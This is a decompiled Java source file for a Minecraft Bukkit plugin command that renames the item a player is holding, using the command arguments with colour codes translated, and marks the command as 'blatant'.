/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.meta.ItemMeta
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class RenameCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        ItemStack item = p2.getItemInHand();
        if (item.getType() == Material.AIR) {
            p2.sendMessage(Settings.PREFIX("You aren't holding anything!"));
        } else {
            StringBuilder newName = new StringBuilder();
            for (int i2 = 1; i2 != args.length; ++i2) {
                newName.append(args[i2]).append(" ");
            }
            ItemMeta meta = item.getItemMeta();
            if (meta != null) {
                meta.setDisplayName(ChatColor.translateAlternateColorCodes('&', newName.toString()));
                item.setItemMeta(meta);
                p2.sendMessage(Settings.PREFIX("The new name has been set to " + Settings.RED + newName));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

